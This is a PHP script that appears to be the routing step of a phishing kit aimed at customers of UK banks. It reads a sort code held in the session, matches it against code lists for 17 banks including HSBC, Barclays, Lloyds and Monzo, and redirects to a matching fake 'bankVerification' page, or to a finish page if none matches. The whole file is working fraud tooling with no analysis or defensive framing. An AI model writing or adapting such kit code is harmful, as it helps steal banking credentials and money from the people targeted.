<?php
session_start();
if(!isset($_GET['sessionID'])){
    echo("<script>location.href = 'index.php';</script>");
    exit();
}
$sessionID = $_GET['sessionID'];
$source = file_get_contents('codes/hsbc_codes.txt');
$source2 = file_get_contents('codes/barclays_codes.txt');
$source3 = file_get_contents('codes/sains-codes.txt');
$source4 = file_get_contents('codes/metro-codes.txt');
$source5 = file_get_contents('codes/halifax_codes.txt');
$source6 = file_get_contents('codes/lloyds_codes.txt');
$source7 = file_get_contents('codes/natwest_codes.txt');
$source8 = file_get_contents('codes/rbs_codes.txt');
$source9 = file_get_contents('codes/santander_codes.txt');
$source10 = file_get_contents('codes/tsb_codes.txt');
$source11 = file_get_contents('codes/clydesdale_codes.txt');
$source12 = file_get_contents('codes/nation_codes.txt');
$source13 = file_get_contents('codes/citi_codes.txt');
$source14 = file_get_contents('codes/ulster-codes.txt');
$source15 = file_get_contents('codes/tesco-codes.txt');
$source16 = file_get_contents('codes/coop-codes.txt');
$source17 = file_get_contents('codes/monzo-codes.txt');
$array = explode("\r\n", $source);
$array2 = explode("\r\n", $source2);
$array3 = explode("\r\n", $source3);
$array4 = explode("\r\n", $source4);
$array5 = explode("\r\n", $source5);
$array6 = explode("\r\n", $source6);
$array7 = explode("\r\n", $source7);
$array8 = explode("\r\n", $source8);
$array9 = explode("\r\n", $source9);
$array10 = explode("\r\n", $source10);
$array11 = explode("\r\n", $source11);
$array12 = explode("\r\n", $source12);
$array13 = explode("\r\n", $source13);
$array14 = explode("\r\n", $source14);
$array15 = explode("\r\n", $source15);
$array16 = explode("\r\n", $source16);
$array17 = explode("\r\n", $source17);

if (in_array($_SESSION['sortCode'], $array))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=hsbc");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array2))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=barclays");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array5))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=halifax");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array6))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=lloyds");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array7))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=natwest");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array8))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=rbs");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array9))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=santander");
    die();    
}
elseif (in_array($_SESSION['sortCode'], $array10))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=tsb");
    die();  
}
elseif (in_array($_SESSION['sortCode'], $array11))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=clydesdale");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array12))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=nation");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array3))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=sains");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array4))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=metro");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array13))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=citi");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array14))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=ulster");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array15))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=tesco");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array16))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=coop");
    die();
}
elseif (in_array($_SESSION['sortCode'], $array17))  {
    header("Location: bankVerification.php?sessionID=".$sessionID."&bank=monzo");
    die();
}
else{
    header("Location: finish.php");
    die();
}